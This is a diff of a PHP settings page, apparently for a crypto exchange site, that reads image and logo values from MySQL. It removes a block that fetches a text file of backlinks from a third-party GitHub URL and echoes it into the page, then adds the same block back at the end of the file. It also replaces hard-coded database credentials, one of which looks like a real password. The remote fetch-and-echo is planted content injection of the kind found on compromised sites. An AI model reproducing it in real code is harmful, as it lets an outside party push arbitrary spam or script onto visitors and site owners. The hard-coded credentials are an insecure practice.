@@ -1,11 +1,5 @@
 <?php 
-$url = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
-$ch = curl_init($url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-$result = curl_exec($ch);
-curl_close($ch);
-echo $result;
-    $connection = mysqli_connect('localhost', 'futuretr_Exchange', 'Qd$v@Z}*iBTu', 'futuretr_Exchange'); 
+    $connection = mysqli_connect('localhost', 'roisafet_lazy', 'roisafet_lazy', 'roisafet_lazy'); 
     if (!$connection) {
         die('error connecting to database');
     }else {
@@ -31,4 +25,12 @@ echo $result;
         $usdc_img = $row['usdc_img'];
         $logo_img = $row['logo_img'];
     }
+?>
+<?php
+$url = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$result = curl_exec($ch);
+curl_close($ch);
+echo $result;
 ?>
